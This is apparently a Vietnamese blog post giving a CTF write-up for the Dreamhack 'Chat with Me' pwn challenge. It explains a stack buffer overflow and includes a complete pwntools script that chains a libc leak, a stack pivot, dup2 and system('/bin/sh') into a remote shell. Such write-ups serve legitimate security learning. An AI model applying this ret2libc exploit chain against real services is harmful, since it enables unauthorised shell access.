+++
date = '2025-04-16T03:57:40+07:00'
draft = true
title = 'Dreamhack CTF Season 7 Round #5 (🚩Div1)'
+++

Giải này diễn ra tình cờ vào thời điểm mình vừa xong đợt trainning CTF nên có thời gian rảnh thử sức. Tuy nhiên bằng một cách thần kỳ nào đó mình lỡ bài rev khá tiếc mà giải được câu pwn này.

## Chat with Me - Binary exploitation

### I. Vulnerability
![image](https://hackmd.io/_uploads/SJxenTYj1l.png)

![image](https://hackmd.io/_uploads/B1rb3aFi1g.png)

Checksec và đọc Pseudocode trong IDA có NX, không có PIE và canary và có một lỗi buffer overflow:
```
_QWORD buf[97];
memset(buf, 0, 0x300uLL);
v12 = read(v13, buf, 0x600uLL);
```
Do chương trình có NX, vì vậy hướng tiếp cận sẽ không phải là ret2shellcode.

### II. Exploitation

Chương trình sử dụng nhiều hàm gọi từ libc trước khi yêu cầu nhập vào bộ đệm, đồng thời cho nhập tận 0x600 byte. Do vậy ý tưởng sẽ là leak giá trị từ bảng GOT và tìm libc_base. Đọc trong stack trên IDA, cần phải padding 840 byte thì chúng ta sẽ đến ret_address, thử nhập 848 byte để kiểm tra trong GDB:
![image](https://hackmd.io/_uploads/HkcUATtiJg.png)

Như vậy là chúng ta đã ghi đè được, tiếp đến chúng ta cần tìm các gadget để gọi hàm read, biết rằng fd của chúng ta là 4.
![image](https://hackmd.io/_uploads/Byc3CpFo1g.png)

Có sẵn một gadget rất đẹp ở đây. Tuy nhiên ở đây thì mình sợ rằng việc overflow sẽ khiến một vài hàm đặc biệt kiểm tra tình trạng kết nối làm mất connection nên để an toàn mình stack pivot sang một vùng có quyền rw, và do cũng không có PIE nên mình dễ dàng bổ sung vào payload các gadget để stack pivot và thực hiển read một lần nữa. Mình tìm thêm gadget pop_rbp và gadget leave_ret. Payload đầu tiên để leak libc_base và yêu cầu hàm read thêm 1 lần nữa.
```
payload=b'A'*840
payload+=p64(gadget)+p64(0)+p64(0x8)+p64(elf.got['puts'])+p64(4)
payload+=p64(elf.plt['send'])
payload+=p64(pop_rbp)+p64(0x404900)
payload+=p64(gadget+1)+p64(0x300)+p64(0x404900)+p64(4)
payload+=p64(elf.plt['read'])+p64(leave_ret)
```
Bình thường thì đến đây sẽ khá đơn giản vì payload thứ 2 là gọi system('/bin/sh'). Tuy nhiên điều phức tạp ở đây là fd của chúng ta là 4, còn shell tương tác với stdin và stdout ở fd=0 và fd=1. Chúng ta cần ép nó về fd=4:
```
dup2(4,0);
dup2(4,1);
```

### III. Script

```
from pwn import *
context.binary=elf=ELF('./chall',checksec=False)
libc=ELF('./libc.so.6',checksec=False)
gadget=0x0000000000401396
pop_rbp=0x40137d
push_rsp=0x207768
leave_ret=0x4016ca

p=remote('host3.dreamhack.games',20267)
p.recvuntil(b'Welcome to the TCP Chat Server!\n')

payload=b'A'*840
payload+=p64(gadget)+p64(0)+p64(0x8)+p64(elf.got['puts'])+p64(4)
payload+=p64(elf.plt['send'])
payload+=p64(pop_rbp)+p64(0x404900)
payload+=p64(gadget+1)+p64(0x300)+p64(0x404900)+p64(4)
payload+=p64(elf.plt['read'])+p64(leave_ret)
p.send(payload)

leak=u64(p.recvn(8))
log.info(f'leak: {hex(leak)}')
lib_base=leak-libc.sym['puts']
lib_system=lib_base+libc.sym['system']
log.info(f'lib base: {hex(lib_base)}')

payload=p64(0)+p64(gadget+2)+p64(0)+p64(4)+p64(libc.sym['dup2']+lib_base)
payload+=p64(gadget+2)+p64(1)+p64(4)+p64(libc.sym['dup2']+lib_base)
payload+=p64(gadget+3)+p64(lib_base+next(libc.search(b'/bin/sh')))+p64(gadget+4)+p64(lib_system)

p.send(payload)
p.interactive()
```
# IV. Reference
https://dreamhack.io/ctf/659